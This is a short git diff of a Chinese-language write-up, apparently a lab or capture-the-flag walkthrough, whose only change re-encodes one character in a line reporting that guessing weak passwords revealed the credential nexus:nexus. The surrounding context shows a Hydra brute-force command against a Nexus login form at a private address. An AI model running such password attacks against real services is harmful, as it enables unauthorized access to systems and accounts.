@@ -62,7 +62,7 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 192.168.250.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^spassw0rd=^PASS64^:Forbidden‘
 ```
 
-* 因考虑到Hydra爆破耗时漫长，所以与此同时决定猜测弱口令，简单猜测几次后发现了有效凭证_<mark style="color:red;">**nexus:nexus  😄**</mark>_
+* 因考虑到Hydra爆破耗时漫长，所以与此同时决定猜测弱口令，简单猜测几次后发现了有效凭&#x8BC1;_<mark style="color:red;">**nexus:nexus  😄**</mark>_
 
 <figure><img src="../.gitbook/assets/13 (9).png" alt=""><figcaption></figcaption></figure>
 
